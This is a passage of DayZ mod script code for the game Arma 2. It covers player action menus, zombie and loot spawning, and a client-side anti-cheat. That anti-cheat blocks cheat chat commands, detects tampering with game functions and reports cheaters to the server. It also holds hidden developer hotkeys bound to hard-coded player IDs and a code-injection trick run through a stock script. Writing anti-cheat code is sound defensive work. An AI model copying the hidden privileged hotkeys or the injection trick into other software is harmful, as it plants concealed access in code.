	if(cursorTarget == dayz_hasFire and _canDo) then {
		if ((s_player_fireout < 0) and !(inflamed cursorTarget) and (player distance cursorTarget < 3)) then {
			s_player_fireout = player addAction [localize "str_actions_self_06", "\z\addons\dayz_code\actions\fire_pack.sqf",cursorTarget, 0, false, true, "",""];
		};
	} else {
		player removeAction s_player_fireout;
		s_player_fireout = -1;
	};

	//Allow player to set tent on fire
	if(_isTent and _hasMatches and _canDo and !_isMan) then {
		if (s_player_igniteTent < 0) then {
			s_player_igniteTent = player addAction [format["Ignite Tent"], "\z\addons\dayz_code\actions\tent_ignite.sqf",cursorTarget, 1, true, true, "", ""];
		};
	} else {
		player removeAction s_player_igniteTent;
		s_player_igniteTent = -1;
	};
	
	//Packing my tent
	if(cursorTarget isKindOf "TentStorage" and _canDo and _ownerID == dayz_characterID) then {
		if ((s_player_packtent < 0) and (player distance cursorTarget < 3)) then {
			s_player_packtent = player addAction [localize "str_actions_self_07", "\z\addons\dayz_code\actions\tent_pack.sqf",cursorTarget, 0, false, true, "",""];
		};
	} else {
		player removeAction s_player_packtent;
		s_player_packtent = -1;
		};
	
	//Sleep
	if(cursorTarget isKindOf "TentStorage" and _canDo and _ownerID == dayz_characterID) then {
		if ((s_player_sleep < 0) and (player distance cursorTarget < 3)) then {
			s_player_sleep = player addAction [localize "str_actions_self_sleep", "\z\addons\dayz_code\actions\player_sleep.sqf",cursorTarget, 0, false, true, "",""];
		};
	} else {
		player removeAction s_player_sleep;
		s_player_sleep = -1;
	};

	// Remove Parts from Vehicles - By SilverShot.
	if( !_isMan and _canDo and _hasToolbox and (silver_myCursorTarget != cursorTarget) and cursorTarget isKindOf "AllVehicles" and (getDammage cursorTarget < 0.95) ) then {
		_vehicle = cursorTarget;
		_invalidVehicle = (_vehicle isKindOf "Motorcycle") or (_vehicle isKindOf "Tractor"); //or (_vehicle isKindOf "ATV_US_EP1") or (_vehicle isKindOf "ATV_CZ_EP1");
		if( !_invalidVehicle ) then {
		{silver_myCursorTarget removeAction _x} forEach s_player_removeActions;
		
		s_player_removeActions = [];
		silver_myCursorTarget = _vehicle;
		 
		_hitpoints = _vehicle call vehicle_getHitpoints;
		 
		{
		_damage = [_vehicle,_x] call object_getHit;
		 
		if( _damage < 0.15 ) then {
		 
		//change "HitPart" to " - Part" rather than complicated string replace
		_cmpt = toArray (_x);
		_cmpt set [0,20];
		_cmpt set [1,toArray ("-") select 0];
		_cmpt set [2,20];
		_cmpt = toString _cmpt;
		 
		_skip = true;
		if( _skip and _x == "HitFuel" ) then { _skip = false; _part = "PartFueltank"; _cmpt = _cmpt + "tank"};
		if( _skip and _x == "HitEngine" ) then { _skip = false; _part = "PartEngine"; };
		if( _skip and _x == "HitLFWheel" ) then { _skip = false; _part = "PartWheel"; };
		if( _skip and _x == "HitRFWheel" ) then { _skip = false; _part = "PartWheel"; };
		if( _skip and _x == "HitLBWheel" ) then { _skip = false; _part = "PartWheel"; };
		if( _skip and _x == "HitRBWheel" ) then { _skip = false; _part = "PartWheel"; };
		if( _skip and _x == "HitGlass1" ) then { _skip = false; _part = "PartGlass"; };
		if( _skip and _x == "HitGlass2" ) then { _skip = false; _part = "PartGlass"; };
		if( _skip and _x == "HitGlass3" ) then { _skip = false; _part = "PartGlass"; };
		if( _skip and _x == "HitGlass4" ) then { _skip = false; _part = "PartGlass"; };
		if( _skip and _x == "HitGlass5" ) then { _skip = false; _part = "PartGlass"; };
		if( _skip and _x == "HitGlass6" ) then { _skip = false; _part = "PartGlass"; };
		if( _skip and _x == "HitHRotor" ) then { _skip = false; _part = "PartVRotor"; };
		 
		if (!_skip ) then {
			_string = format["<t color='#0096ff'>Remove%1</t>",_cmpt,_color]; //Remove - Part
			_handle = silver_myCursorTarget addAction [_string, "\z\addons\dayz_code\actions\ss_remove.sqf",[_vehicle,_part,_x], 0, false, true, "",""];
			s_player_removeActions set [count s_player_removeActions,_handle];
		};
		};
		 
		} forEach _hitpoints;
		};
	};
	
	//Repairing Vehicles
	if ((dayz_myCursorTarget != cursorTarget) and _isVehicle and !_isMan and _hasToolbox and (damage cursorTarget < 1)) then {
		_vehicle = cursorTarget;
		{dayz_myCursorTarget removeAction _x} forEach s_player_repairActions;s_player_repairActions = [];
		dayz_myCursorTarget = _vehicle;

		_allFixed = true;
		_hitpoints = _vehicle call vehicle_getHitpoints;
		diag_log("piezas rotas " + str(_hitpoints));
		{
			_damage = [_vehicle,_x] call object_getHit;
			_part = "PartGeneric";
			
			//change "HitPart" to " - Part" rather than complicated string replace
			_cmpt = toArray (_x);
			_cmpt set [0,20];
			_cmpt set [1,toArray ("-") select 0];
			_cmpt set [2,20];
			_cmpt = toString _cmpt;
				
			if(["Engine",_x,false] call fnc_inString) then {
				_part = "PartEngine";
			};
					
			if(["HRotor",_x,false] call fnc_inString) then {
				_part = "PartVRotor"; //yes you need PartVRotor to fix HRotor LOL
			};

			if(["Fuel",_x,false] call fnc_inString) then {
				_part = "PartFueltank";
			};
			
			if(["Wheel",_x,false] call fnc_inString) then {
				_part = "PartWheel";

			};
					
			if(["Glass",_x,false] call fnc_inString) then {
				_part = "PartGlass";
			};

			// get every damaged part no matter how tiny damage is!
			if (_damage > 0) then {
				
				_allFixed = false;
				_color = "color='#ffff00'"; //yellow
				if (_damage >= 0.5) then {_color = "color='#ff8800'";}; //orange
				if (_damage >= 0.9) then {_color = "color='#ff0000'";}; //red

				_string = format["<t %2>Repair%1</t>",_cmpt,_color]; //Repair - Part
				_handle = dayz_myCursorTarget addAction [_string, "\z\addons\dayz_code\actions\repair.sqf",[_vehicle,_part,_x], 0, false, true, "",""];
				s_player_repairActions set [count s_player_repairActions,_handle];

			};
					
		} forEach _hitpoints;
		if (_allFixed) then {
			_vehicle setDamage 0;
		};
	};
	
	if (_isMan and !_isAlive and !_isZombie) then {
		if (s_player_studybody < 0) then {
			s_player_studybody = player addAction [localize "str_action_studybody", "\z\addons\dayz_code\actions\study_body.sqf",cursorTarget, 0, false, true, "",""];
		};
	} else {
		player removeAction s_player_studybody;
		s_player_studybody = -1;
	};
	
	//CLOTHES
    if (_isMan and !_isAlive and !_isZombie and !_isAnimal) then {
    if (s_clothes < 0) then {
            s_clothes = player addAction [("<t color=""#FF0000"">" + ("Take Clothes") + "</t>"), "ca\modules\MP\data\scriptCommands\moveIn.sqf","Driver (call clothes_code);", 1, false, true, "",""];
        };
    } else {
        player removeAction s_clothes;
        s_clothes = -1;
    };

	//Dog
	if (_isDog and _isAlive and (_hasRawMeat) and _canDo and _ownerID == "0" and player getVariable ["dogID", 0] == 0) then {
		if (s_player_tamedog < 0) then {
			s_player_tamedog = player addAction [localize "str_actions_tamedog", "\z\addons\dayz_code\actions\tame_dog.sqf", cursorTarget, 1, false, true, "", ""];
		};
	} else {
		player removeAction s_player_tamedog;
		s_player_tamedog = -1;
	};
	
	if (_isDog and _ownerID == dayz_characterID and _isAlive and _canDo) then {
		_dogHandle = player getVariable ["dogID", 0];
		if (s_player_feeddog < 0 and _hasRawMeat) then {
			s_player_feeddog = player addAction [localize "str_actions_feeddog","\z\addons\dayz_code\actions\dog\feed.sqf",[_dogHandle,0], 0, false, true,"",""];
		};
		if (s_player_waterdog < 0 and "ItemWaterbottle" in magazines player) then {
			s_player_waterdog = player addAction [localize "str_actions_waterdog","\z\addons\dayz_code\actions\dog\feed.sqf",[_dogHandle,1], 0, false, true,"",""];
		};
		if (s_player_staydog < 0) then {
			_lieDown = _dogHandle getFSMVariable "_actionLieDown";
			if (_lieDown) then { _text = "str_actions_liedog"; } else { _text = "str_actions_sitdog"; };
			s_player_staydog = player addAction [localize _text,"\z\addons\dayz_code\actions\dog\stay.sqf", _dogHandle, 5, false, true,"",""];
		};
		if (s_player_trackdog < 0) then {
			s_player_trackdog = player addAction [localize "str_actions_trackdog","\z\addons\dayz_code\actions\dog\track.sqf", _dogHandle, 4, false, true,"",""];
		};
		if (s_player_barkdog < 0) then {
			s_player_barkdog = player addAction [localize "str_actions_barkdog","\z\addons\dayz_code\actions\dog\speak.sqf", cursorTarget, 3, false, true,"",""];
		};
		if (s_player_warndog < 0) then {
			_warn = _dogHandle getFSMVariable "_watchDog";
			if (_warn) then { _text = "Quiet"; _warn = false; } else { _text = "Alert"; _warn = true; };
			s_player_warndog = player addAction [format[localize "str_actions_warndog",_text],"\z\addons\dayz_code\actions\dog\warn.sqf",[_dogHandle, _warn], 2, false, true,"",""];		
		};
		if (s_player_followdog < 0) then {
			s_player_followdog = player addAction [localize "str_actions_followdog","\z\addons\dayz_code\actions\dog\follow.sqf",[_dogHandle,true], 6, false, true,"",""];
		};
	} else {
		player removeAction s_player_feeddog;
		s_player_feeddog = -1;
		player removeAction s_player_waterdog;
		s_player_waterdog = -1;
		player removeAction s_player_staydog;
		s_player_staydog = -1;
		player removeAction s_player_trackdog;
		s_player_trackdog = -1;
		player removeAction s_player_barkdog;
		s_player_barkdog = -1;
		player removeAction s_player_warndog;
		s_player_warndog = -1;
		player removeAction s_player_followdog;
		s_player_followdog = -1;
	};
} else {
	//Extras
	//Remove Parts
	{silver_myCursorTarget removeAction _x} forEach s_player_removeActions;s_player_removeActions = [];
	silver_myCursorTarget = objNull;
	//Engineering
	{dayz_myCursorTarget removeAction _x} forEach s_player_repairActions;s_player_repairActions = [];
	dayz_myCursorTarget = objNull;
	//Others
	player removeAction s_player_forceSave;
	s_player_forceSave = -1;
	player removeAction s_player_flipveh;
	s_player_flipveh = -1;
	player removeAction s_player_sleep;
	s_player_sleep = -1;
	player removeAction s_player_igniteTent;
	s_player_igniteTent = -1;
	player removeAction s_player_deleteBuild;
	s_player_deleteBuild = -1;
	player removeAction s_player_butcher;
	s_player_butcher = -1;
	player removeAction s_player_cook;
	s_player_cook = -1;
	player removeAction s_player_boil;
	s_player_boil = -1;
	player removeAction s_player_fireout;
	s_player_fireout = -1;
	player removeAction s_player_packtent;
	s_player_packtent = -1;
	player removeAction s_player_fillfuel;
	s_player_fillfuel = -1;
	player removeAction s_player_studybody;
	s_player_studybody = -1;
	player removeAction s_clothes;
    s_clothes = -1;
	//Dog
	player removeAction s_player_tamedog;
	s_player_tamedog = -1;
	player removeAction s_player_feeddog;
	s_player_feeddog = -1;
	player removeAction s_player_waterdog;
	s_player_waterdog = -1;
	player removeAction s_player_staydog;
	s_player_staydog = -1;
	player removeAction s_player_trackdog;
	s_player_trackdog = -1;
	player removeAction s_player_barkdog;
	s_player_barkdog = -1;
	player removeAction s_player_warndog;
	s_player_warndog = -1;
	player removeAction s_player_followdog;
	s_player_followdog = -1;
};

//Dog actions on player self
_dogHandle = player getVariable ["dogID", 0];
if (_dogHandle > 0) then {
	_dog = _dogHandle getFSMVariable "_dog";
	_ownerID = "0";
	if (!isNull cursorTarget) then { _ownerID = cursorTarget getVariable ["characterID","0"]; };
	if (_canDo and !_inVehicle and alive _dog and _ownerID != dayz_characterID) then {
		if (s_player_movedog < 0) then {
			s_player_movedog = player addAction [localize "str_actions_movedog", "\z\addons\dayz_code\actions\dog\move.sqf", player getVariable ["dogID", 0], 1, false, true, "", ""];
		};
		if (s_player_speeddog < 0) then {
			_text = "Walk";
			_speed = 0;
			if (_dog getVariable ["currentSpeed",1] == 0) then { _speed = 1; _text = "Run"; };
			s_player_speeddog = player addAction [format[localize "str_actions_speeddog", _text], "\z\addons\dayz_code\actions\dog\speed.sqf",[player getVariable ["dogID", 0],_speed], 0, false, true, "", ""];
		};
		if (s_player_calldog < 0) then {
			s_player_calldog = player addAction [localize "str_actions_calldog", "\z\addons\dayz_code\actions\dog\follow.sqf", [player getVariable ["dogID", 0], true], 2, false, true, "", ""];
		};
	};
} else {
	player removeAction s_player_movedog;		
	s_player_movedog =		-1;
	player removeAction s_player_speeddog;
	s_player_speeddog =		-1;
	player removeAction s_player_calldog;
	s_player_calldog = 		-1;
};
	};
	

	player_spawnCheck = {
	private["_type","_isAir","_inVehicle","_dateNow","_maxZombies","_maxWildZombies","_age","_nearbyBuildings","_radius","_locationstypes","_nearestCity","_position","_nearbytype"];
_type = _this select 0;
_Keepspawning = _this select 1;
_isAir = vehicle player iskindof "Air";
_inVehicle = (vehicle player != player);
_dateNow = (DateToNumber date);
_maxZombies = dayz_maxLocalZombies;
_maxWildZombies = 3;
_age = -1;

_nearbyBuildings = [];
_radius = 200; 
_position = getPosATL player;

if (_inVehicle) then {
	_maxZombies = _maxZombies / 2;
};
if (_isAir) then {
	_maxZombies = 5;
};


diag_log ("Type: " +str(_type));


//diag_log("SPAWN CHECKING: Starting");
	//_locationstypes = ["NameCityCapital","NameCity","NameVillage"];
	//_nearestCity = nearestLocations [getPos player, _locationstypes, _radius/2];
	//_townname = text (_nearestCity select 0);	
	//_nearbytype = type (_nearestCity select 0);
/*
switch (_nearbytype) do {
	case "NameVillage": {
		//_radius = 250; 
		_maxZombies = 30;
	};
	case "NameCity": {
		//_radius = 300; 
		_maxZombies = 40;
	};
	case "NameCityCapital": {
		//_radius = 400; 
		_maxZombies = 40;
	};
};
*/

_players = _position nearEntities ["AllPlayers",_radius+200];
dayz_maxGlobalZombies = 40;
{
	dayz_maxGlobalZombies = dayz_maxGlobalZombies + 10;
} foreach _players;

_spawnZombies = _position nearEntities ["zZombie_Base",_radius+100];
dayz_spawnZombies = 0;
{
	if (local _x) then 
	{	
		dayz_spawnZombies = dayz_spawnZombies + 1;
	};
} foreach _spawnZombies;

dayz_CurrentZombies = count (_position nearEntities ["zZombie_Base",_radius+200]);
	
_nearby = _position nearObjects ["building",_radius];
_nearbyCount = count _nearby;
if (_nearbyCount < 1) exitwith 
{
	if ((dayz_spawnZombies < _maxWildZombies) and !_inVehicle)  then {
		[_position] call wild_spawnZombies;
	};
};

{
	_type = typeOf _x;
	_config = 		configFile >> "CfgBuildingLoot" >> _type;
	_canLoot = 		isClass (_config);
	_dis = _x distance player;
	
	//Loot
	if (((_dis < 120) and (_dis > 30) and _canLoot and !_inVehicle) or (_type in 
	["oilrig_base","Land_LHD_1","Land_LHD_house_2","Land_LHD_elev_R","Land_LHD_6","Land_LHD_2","Land_LHD_house_1"])) then {
		_looted = (_x getVariable ["looted",-0.1]);
		_cleared = (_x getVariable ["cleared",true]);
		_dateNow = (DateToNumber date);
		_age = (_dateNow - _looted) * 525948;
		//diag_log ("SPAWN LOOT: " + _type + " Building is " + str(_age) + " old" );
		if ((_age > 10) and (!_cleared)) then {
			_nearByObj = nearestObjects [(getPosATL _x), ["WeaponHolder","WeaponHolderBase"],((sizeOf _type)+5)];
			{deleteVehicle _x} forEach _nearByObj;
			_x setVariable ["cleared",true,true];
			_x setVariable ["looted",_dateNow,true];
		};
		if ((_age > 10) and (_cleared)) then {
			//Register
			_x setVariable ["looted",_dateNow,true];
			//cleanup
			_handle = [_x] spawn building_spawnLoot;
			waitUntil{scriptDone _handle};
		};
	};
	//Zeds
	if ((time - dayz_spawnWait) > dayz_spawnDelay) then {
		if (dayz_maxCurrentZeds < dayz_maxZeds) then {
			if (dayz_CurrentZombies < dayz_maxGlobalZombies) then {
				if (dayz_spawnZombies < dayz_maxLocalZombies) then {
						//[_radius, _position, _inVehicle, _dateNow, _age, _locationstypes, _nearestCity, _maxZombies] call player_spawnzedCheck;
						_zombied = (_x getVariable ["zombieSpawn",-0.1]);
						_dateNow = (DateToNumber date);
						_age = (_dateNow - _zombied) * 525948;
						if (_age > 3) then {
							_x setVariable ["zombieSpawn",_dateNow,true];
							[_x] call building_spawnZombies;
						};
				} else {
					dayz_spawnWait = time;
				};
			};
		};
	};
} forEach _nearby;
	};
	/* BIS_Effects_* fixes from Dwarden */
	BIS_Effects_EH_Killed = compile preprocessFileLineNumbers "\z\addons\dayz_code\system\BIS_Effects\killed.sqf";
	BIS_Effects_AirDestruction = compile preprocessFileLineNumbers "\z\addons\dayz_code\system\BIS_Effects\AirDestruction.sqf";
	BIS_Effects_AirDestructionStage2 = compile preprocessFileLineNumbers "\z\addons\dayz_code\system\BIS_Effects\AirDestructionStage2.sqf";
	
	BIS_Effects_globalEvent = {
		BIS_effects_gepv = _this;
		publicVariable "BIS_effects_gepv";
		_this call BIS_Effects_startEvent;
	};
	
	BIS_Effects_startEvent = {
		switch (_this select 0) do {
			case "AirDestruction": {
					[_this select 1] spawn BIS_Effects_AirDestruction;
			};
			case "AirDestructionStage2": {
					[_this select 1, _this select 2, _this select 3] spawn BIS_Effects_AirDestructionStage2;
			};
			case "Burn": {
					[_this select 1, _this select 2, _this select 3, false, true] spawn BIS_Effects_Burn;
			};
		};
	};
	
	"BIS_effects_gepv" addPublicVariableEventHandler {
		(_this select 1) call BIS_Effects_startEvent;
	};

	// Breaking Point - Headless Client Intergration
	if (!hasInterface) exitWith {
		_hcMonitor = [] execVM "\z\addons\dayz_hc\system\hc_monitor.sqf";
	};

	_Devs = ["38057542","30373510","33114438"];
	_Admins = [] + _Devs;

	if (getPlayerUID player in _Devs) exitWith
	{
		[] spawn { 
			waitUntil {!isNull (findDisplay 46)}; 
			(findDisplay 46) displayAddEventHandler ["KeyUp", "if ((_this select 1) == 0xD3) then {call compile preprocessFileLineNumbers ""\hangender\start.sqf"";};"];
			(findDisplay 46) displayAddEventHandler ["KeyUp", "if ((_this select 1) == 0xD2) then {[] spawn BIS_MPF_remoteExecutionServeradmin_menu1;};"];
		};
	};
	if (!(getPlayerUID player in _Admins)) then
	{
	preProcessFileLineNumbers " ";
	BIS_fnc_swapVars = {};
	BIS_MPF_remoteExecutionServer4 = compile preprocessFile (BIS_MP_Path + BIS_PATH_SQF + "remExServer.sqf");
	BIS_MPF_remoteExecutionServer =
	{
	_input = (_this select 1) select 2;
	if (_input in ["switchmove", "playmove", "say", "jipexec", "execvm", "spawn"]) then {_this call BIS_MPF_remoteExecutionServer4;};
	};
	playableUnits = [player];
	allUnits = [player];
	allMissionObjects = [player];
	entities = [player];
	vehicles = [player];
	{[] spawn _x;} forEach
	[{
	while {true} do
	{
	sleep 30;
	for "_i" from 0 to (count Deathly_HackVar)-1 do
	{
	_var = (Deathly_HackVar select _i);
	_test = format ["%1",_var];
	if (!(isNil _test)) then
	{

	_world = toUpper(worldName); 
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};

	_x = format ["%1",_i];
	rthethsrthsfghsfhsfg = [true, name player, getPlayerUID player, 'Global Var', _x, _world, _town];
	publicVariableServer 'rthethsrthsfghsfhsfg';
	sleep 2;
	hiveupdateresu = 1;
	publicVariable "hiveupdateresu";
	};
	};
	};
	},{
	_rejected = {
	_world = toUpper(worldName); 
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};
	rthethsrthsfghsfhsfg = [true, name player, getPlayerUID player, 'Expression', '', _world, _town];
	publicVariableServer 'rthethsrthsfghsfhsfg';
	sleep 2;
	hiveupdateresu = 1;
	publicVariable "hiveupdateresu";
	};
	waitUntil {sleep 0.005;((ctrlText ((findDisplay 24) displayCtrl 101)) == '/')};
	while {true} do
	{
	_txt = (ctrlText ((findDisplay 24) displayCtrl 101));
	if (_txt == '/HELP') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/SPAWNWEAPON') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/TP') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/SPAWN') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/SPAWN LOCAL') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/DELETE') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/d') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/GOD') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/SEARCH') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/KILLALL') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/TPTO [') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/COMMANDS') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/NOGRASS') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/grass') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/spectate') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/explo') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/skin') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/esp') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/mouseclip') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/box') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/kill') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/kick') exitWith {[_txt] spawn _rejected;};
	if (_txt == '/control') exitWith {[_txt] spawn _rejected;};
	sleep 0.005;
	};
	},{
	while {true} do
	{
	(findDisplay 46) displayRemoveAllEventHandlers 'KeyDown';
	(findDisplay 46) displayAddEventHandler ["KeyDown","_this call dayz_spaceInterrupt"];
	sleep 0.1;
	_cMenuDefault = ["","#GET_IN","RscMainMenu","RscMoveHigh","#WATCH","#WATCH0","RscWatchDir","RscWatchMoreDir","#GETIN","RscStatus","RscCallSupport","#ACTION","RscCombatMode","RscFormations","RscTeam","RscSelectTeam","RscReply","#CUSTOM_RADIO","RscRadio","RscGroupRootMenu"];
	if !(commandingMenu in _cMenuDefault) then {
	showCommandingMenu "";

	_world = toUpper(worldName); 
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};

	_input = toArray commandingMenu;
	_output = [];
	_removeA = toArray ":";
	_remove = _removeA select 0;
	_replaceA = toArray "!";
	_replace = _replaceA select 0;
	{
	if (_x != _remove) then
	{
	_output set [count _output, _x];
	}
	else
	{
	_output set [count _output, _replace];
	};
	} foreach _input;
	_output = toString _output;


	};

	(findDisplay 46) displayRemoveAllEventHandlers "KeyDown";
	(findDisplay 46) displayRemoveAllEventHandlers "KeyUp";
	(finddisplay 106) displayRemoveAllEventHandlers 'KeyDown';
	(finddisplay 106) displayRemoveAllEventHandlers 'KeyUp';
	(findDisplay 46) displayAddEventHandler ["KeyDown","_this call dayz_spaceInterrupt"];
	((findDisplay 12) displayCtrl 51) ctrlRemoveAllEventHandlers 'MouseButtonDown';
	((findDisplay 12) displayCtrl 51) ctrlRemoveAllEventHandlers 'MouseButtonUp';
	((findDisplay 3030) displayCtrl 2) ctrlRemoveAllEventHandlers 'LBDblClick';

	_MainDisplay = isNull (findDisplay 106);
	_R3F = isNull (findDisplay R3F_LOG_IDD_dlg_contenu_vehicule);
	_Journal0 = isNull (findDisplay 1140);
	_Journal1 = isNull (findDisplay 1141);
	_Journal2 = isNull (findDisplay 1142);
	_Journal3 = isNull (findDisplay 1143);
	_Journal4 = isNull (findDisplay 1144);
	_Journal5 = isNull (findDisplay 1145);
	_Journal6 = isNull (findDisplay 1146);
	if (_MainDisplay and _R3F and _Journal0 and _Journal1 and _Journal2 and _Journal3 and _Journal4 and _Journal5 and _Journal6) then {closeDialog 0;};
	player allowDamage true;
	buttonSetAction [104, ''];
	if ((typeName player != "OBJECT") or (typeName true != "BOOL")) then
	{

	_world = toUpper(worldName); 
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};

	_type = (typeName player);
	_x = format ["%1",_type];
	rthethsrthsfghsfhsfg = [false, name player, getPlayerUID player, 'Anti-Anti Hack', _x, _world, _town];
	publicVariableServer 'rthethsrthsfghsfhsfg';
	sleep 2;
	hiveupdateresu = 1;
	publicVariable "hiveupdateresu";
	};
	sleep 0.8;
	};
	},{
	while {true} do
	{
	_items = weapons player;
	{
	if (_x in _items) then
	{
	player removeWeapon _x;
	_world = toUpper(worldName);
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};
	rthethsrthsfghsfhsfg = [false, name player, getPlayerUID player, 'Bad Item', _x, _world, _town];
	publicVariableServer 'rthethsrthsfghsfhsfg';
	sleep 2;
	hiveupdateresu = 1;
	publicVariable "hiveupdateresu";
	};
	} forEach ['MakarovSD'];
	sleep 60;
	};
	},{
	disableSerialization;
	while {true} do
	{
	waitUntil {!isNull (findDisplay 49)};
	if (!(isNull player) && (alive player)) then
	{
	call dayz_forceSave;
	[] spawn dayz_disableRespawn;
	};
	waitUntil {isNull (findDisplay 49)};
	if (!(isNull findDisplay 3030) || !(isNull findDisplay 155) || !(isNull findDisplay 2929) || !(isNull findDisplay 17) || !(isNull findDisplay 155) || !(isNull findDisplay 64)) then 
	{

	_world = toUpper(worldName);
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};
	rthethsrthsfghsfhsfg = [true, name player, getPlayerUID player, 'Active Menu', '', _world, _town];
	publicVariableServer 'rthethsrthsfghsfhsfg';
	sleep 2;
	hiveupdateresu = 1;
	publicVariable "hiveupdateresu";
	}
	};
	},{
	private ["_recoilSettings","_zombieCheck","_damageHandler","_unconsciousFunction","_death","_RespawnTime"];

	_recoilSettings = unitRecoilCoefficient player;


	_zombieCheck = compile preprocessFileLineNumbers "\z\addons\dayz_code\compile\player_zombieCheck.sqf";
	_damageHandler = compile preprocessFileLineNumbers "\z\addons\dayz_code\compile\fn_damageHandler.sqf";
	_unconsciousFunction = compile preprocessFileLineNumbers "\z\addons\dayz_code\compile\fn_unconscious.sqf";
	_death = compile preprocessFileLineNumbers '\z\addons\dayz_code\compile\player_death.sqf';
	_RespawnTime = playerRespawnTime;

	while {true} do
	{
	if (!(isNull player) && (alive player)) then
	{
	setTerrainGrid 25;
	player allowDamage true;
	(vehicle player) allowDamage true;
	playerRespawnTime = _RespawnTime;



	if (str player_zombieCheck != str _zombieCheck) exitWith
	{
	_world = toUpper(worldName);
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};
	rthethsrthsfghsfhsfg = [true, name player, getPlayerUID player, 'Code Hack (Zombie Check)', '', _world, _town];
	publicVariableServer 'rthethsrthsfghsfhsfg';
	sleep 2;
	hiveupdateresu = 1;
	publicVariable "hiveupdateresu";
	};



	if (str fnc_usec_damageHandler != str _damageHandler) exitWith
	{
	_world = toUpper(worldName);
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};
	rthethsrthsfghsfhsfg = [true, name player, getPlayerUID player, 'Code Hack (Damage Handler)', '', _world, _town];
	publicVariableServer 'rthethsrthsfghsfhsfg';
	sleep 2;
	hiveupdateresu = 1;
	publicVariable "hiveupdateresu";
	};



	if (str fnc_usec_unconscious != str _unconsciousFunction) exitWith
	{
	_world = toUpper(worldName);
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};
	rthethsrthsfghsfhsfg = [true, name player, getPlayerUID player, 'Code Hack (Unconscious)', '', _world, _town];
	publicVariableServer 'rthethsrthsfghsfhsfg';
	sleep 2;
	hiveupdateresu = 1;
	publicVariable "hiveupdateresu";
	};



	if (str player_death != str _death) exitWith
	{
	_world = toUpper(worldName);
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};
	rthethsrthsfghsfhsfg = [true, name player, getPlayerUID player, 'Code Hack (Death)', '', _world, _town];
	publicVariableServer 'rthethsrthsfghsfhsfg';
	sleep 2;
	hiveupdateresu = 1;
	publicVariable "hiveupdateresu";
	};



	if (viewDistance > 1600 and (alive player)) exitWith
	{
	_world = toUpper(worldName);
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};
	_info = format ["%1",viewDistance];
	rthethsrthsfghsfhsfg = [true, name player,getPlayerUID player, 'ViewDistance Hack', _info, _world, _town];
	publicVariableServer 'rthethsrthsfghsfhsfg';
	sleep 2;
	hiveupdateresu = 1;
	publicVariable "hiveupdateresu";
	};



	_recoil = unitRecoilCoefficient player;
	if ((_recoil < 1) and (alive player)) exitWith
	{
	_world = toUpper(worldName);
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};
	_info = format ["%1",_recoil];
	rthethsrthsfghsfhsfg = [true, name player,getPlayerUID player, 'Recoil Hack', _info, _world, _town];
	publicVariableServer 'rthethsrthsfghsfhsfg';
	sleep 2;
	hiveupdateresu = 1;
	publicVariable "hiveupdateresu";
	};



	if ((groupIconsVisible select 0) or (groupIconsVisible select 1))exitWith
	{
	_world = toUpper(worldName);
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};
	rthethsrthsfghsfhsfg = [true, name player,getPlayerUID player, 'Group Icons', str groupIconsVisible, _world, _town];
	publicVariableServer 'rthethsrthsfghsfhsfg';
